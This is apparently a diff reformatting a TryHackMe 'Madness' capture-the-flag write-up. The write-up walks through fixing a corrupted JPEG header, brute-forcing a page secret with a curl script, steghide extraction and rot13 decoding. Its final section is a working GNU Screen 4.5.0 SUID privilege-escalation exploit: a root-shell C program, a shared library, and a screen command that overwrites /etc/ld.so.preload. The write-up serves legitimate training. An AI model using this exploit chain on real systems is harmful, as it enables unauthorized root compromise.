@@ -20,25 +20,32 @@
 
 ![2](images/page.jpg)
 
-**There's a comment through the lines** ``They will never find me`` **and an image above, so it's obvious that the image it's a path to go on. Let's get that image into our machine**
+**There's a comment through the lines** ``They will never find me`` **and an image above, so it's obvious that the image it's a path to go on.**
+**Let's get that image into our machine**
 
 ``wget http://10.10.94.80/thm.jpg``
 
 + **Opening the image, we have a quite little problem:**
 
-``The image “file://x/Madness/thm.jpg” cannot be displayed because it contains errors.``
+```text
+The image “file://x/Madness/thm.jpg” cannot be displayed because it contains errors.
+```
 
-**Let's look into the content of our image. It looks like our output says that our image is in PNG format. Maybe someone changed the image format.**
+**Let's look into the content of our image.**
+**It looks like our output says that our image is in PNG format.**
+**Maybe someone changed the image format.**
 
 ![3](images/head.jpg)
 
-+ **Furthermore, reading the [JPEG Signature](https://www.file-recovery.com/jpg-signature-format.htm) article, we can spot this: *JPEG files (compressed images) start with an image marker that always contains the tag code hex values FF D8 FF.* Let's take a look into our image header in hex format, using hexdump**
++ **Furthermore, reading the [JPEG Signature](https://www.file-recovery.com/jpg-signature-format.htm) article, we can spot this: *JPEG files (compressed images) start with an image marker that always contains the tag code hex values FF D8 FF.***
+**Let's take a look into our image header in hex format, using hexdump**
 
 ``hexdump thm.jpg | head -1``
 
 ![4](images/hexo.jpg)
 
-**We can clearly see the first bytes are modified, but we can change them using the hexedit tool. Let's modify the first 2 hex sequences values with:**
+**We can clearly see the first bytes are modified, but we can change them using the hexedit tool.**
+**Let's modify the first 2 hex sequences values with:**
 
 ``FF D8 FF E0   00 10 4A 46``
 
@@ -56,11 +63,16 @@
 
 ![7](images/webhid.jpg)
 
-**It seems like our mad friend wants to guess his secret .. But since i'm not a good guesser, let's take a look into the source code of the page.**
+**It seems like our mad friend wants to guess his secret ...**
+**But since i'm not a good guesser, let's take a look into the source code of the page.**
 
 ![8](images/guess_1.jpg)
 
-**He left some unwanted text inside. We know now, that the secret is between 0 and 99, but in the same time, looking into the page we see that there was already a secret entered. Maybe it's a parameter of the page we could enter; let's go on:  + !! don't forget to modify the url and include the hidden found directory.**
+**He left some unwanted text inside.**
+**We know now, that the secret is between 0 and 99, but in the same time, looking into the page we see that there was already a secret entered.**
+**Maybe it's a parameter of the page we could enter;**
+**let's go on:**
+**don't forget to modify the URL and include the hidden found directory.**
 
 ``http://10.10.94.80/x/?secret=2``
 
@@ -68,7 +80,7 @@
 
 **Our secret seems to be entered and read inside the page, so let's go ahead and create a mini brute-force script to check 100 possible variants.**
 
-+ **I'm gonna use curl to get my requests and page data and i will write a shell script**
++ **I'm gonna use `curl` to get my requests and page data and i will write a shell script**
 
 ```bash
 #!/bin/bash
@@ -93,25 +105,33 @@ done
 
 **Let's make it executable too and let's run it!**
 
-``chmod a+x secret_guess.sh``
+```console
+chmod a+x secret_guess.sh
+```
 
-``./secret_guess.sh``
+```console
+./secret_guess.sh
+```
 
 ![10](images/secrfound.jpg)
 
 ## User escalation
 
-+ **We received a message which maybe will help us to decrypt something. After more enumeration, we find out the** thm.jpg **file seems to contain some data inside. We will use steghide to extract the stego image; the passphrase will be the message received**
++ **We received a message which maybe will help us to decrypt something.**
+**After more enumeration, we find out the** `thm.jpg` **file seems to contain some data inside.**
+**We will use steghide to extract the stego image; the passphrase will be the message received**
 
 ``steghide --extract -sf thm.jpg``
 
 ![11](images/foundit.jpg)
 
-**The image contained a file named** hidden.txt **and, reading it we'll find the username. But, it seems to be encoded with a rot13 cipher, so let's decode it**
+**The image contained a file named** `hidden.txt` **and, reading it we'll find the username.**
+**But, it seems to be encoded with a rot13 cipher, so let's decode it**
 
 ``echo "xxxxx" |  tr 'A-Za-z' 'N-ZA-Mn-za-m'``
 
-+ **We have the username, but we have no password so we can connect to the ssh. Continuing the enumeration and considering the predomination of images in this box, we have one image that we probably skipped: the one inside the tryhackme platform.**
++ **We have the username, but we have no password so we can connect to the ssh.**
+**Continuing the enumeration and considering the predomination of images in this box, we have one image that we probably skipped: the one inside the tryhackme platform.**
 
 ![12](images/platform.jpg)
 
@@ -127,7 +147,8 @@ done
 
 ![14](images/user_flago_re.jpg)
 
-**We found our first user flag inside our home directory. Let's move on to the root flag.**
+**We found our first user flag inside our home directory.**
+**Let's move on to the root flag.**
 
 ## Root escalation
 
@@ -137,7 +158,9 @@ done
 
 ![15](images/perm.jpg)
 
-**We can see the** */bin/screen-4.5.0* **and** */bin/screen-4.5.0.old* **both having SUID permission. Reading the [GNU Screen escalation](https://seclists.org/oss-sec/2017/q1/184) request, we can follow up instructions and see that we can open the logfile with root privileges, this meaning we can create a file, owned by root, which can contain anything. Let's check it out**
+**We can see the** `/bin/screen-4.5.0` **and** `/bin/screen-4.5.0.old` **both having SUID permission.**
+**Reading the [GNU Screen escalation](https://seclists.org/oss-sec/2017/q1/184) request, we can follow up instructions and see that we can open the logfile with root privileges, this meaning we can create a file, owned by root, which can contain anything.**
+**Let's check it out**
 
 ``cd /etc``
 
@@ -147,7 +170,10 @@ done
 
 ![16](images/test_1.jpg)
 
-+ **And the file owner is root. Let's exploit this vulnerability. First, let's create a C program so we can generate a root shell and compile it. We're gonna create it in the /tmp directory**
++ **And the file owner is root.**
+**Let's exploit this vulnerability.**
+**First, let's create a C program so we can generate a root shell and compile it.**
+**We're gonna create it in the /tmp directory**
 
 ```C
 #include <stdio.h>
@@ -168,9 +194,15 @@ int main(void)
 }
 ```
 
-``gcc root_sh.c -o root_sh``
+```console
+gcc root_sh.c -o root_sh
+```
 
-+ **We have to make another little thing; if we run the executable, we'll do it as our user. So we need to change the ownership and permission of the file so we can run it as root. To do this, we'll create a dynamic library file and then compile it. Create it into the /tmp directory too.**
++ **We have to make another little thing;**
+**if we run the executable, we'll do it as our user.**
+**So we need to change the ownership and permission of the file so we can run it as root.**
+**To do this, we'll create a dynamic library file and then compile it.**
+**Create it into the /tmp directory too.**
 
 ```C
 #include <stdio.h>
@@ -189,20 +221,22 @@ void libshell(void)
 }
 ```
 
-``gcc -fPIC -shared -ldl /tmp/lib_shell.c -o /tmp/lib_shell.so``
+```console
+gcc -fPIC -shared -ldl /tmp/lib_shell.c -o /tmp/lib_shell.so
+```
 
-+ **What we need to do now is to overwrite the /etc/ld.so.preload file with our shared library** *shell_library.so* **which executes the shell with root privilege. Let's first move into the /etc directory**
++ **What we need to do now is to overwrite the `/etc/ld.so.preload` file with our shared library** `shell_library.so` **which executes the shell with root privilege.**
+**Let's first move into the /etc directory**
 
-``cd /etc``
-
-``screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/lib_shell.so"``
-
-``screen -ls``
-
-``/tmp/root_sh``
+```console
+cd /etc
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/lib_shell.so"
+screen -ls
+/tmp/root_sh
+```
 
 **And we are root!**
 
 ![17](images/root_flag_4.jpg)
 
-+ **This was a very nice box, we learnt about .JPG corrupted files, a GNU Screen vulnerability, some ld.so.preload file overwriting to gain the desired shell and I encourage you hardly to read the [ld.so man page](https://man7.org/linux/man-pages/man8/ld.so.8.html).**
++ **This was a very nice box, we learnt about .JPG corrupted files, a GNU Screen vulnerability, some `ld.so.preload` file overwriting to gain the desired shell and I encourage you hardly to read the [ld.so man page](https://man7.org/linux/man-pages/man8/ld.so.8.html).**
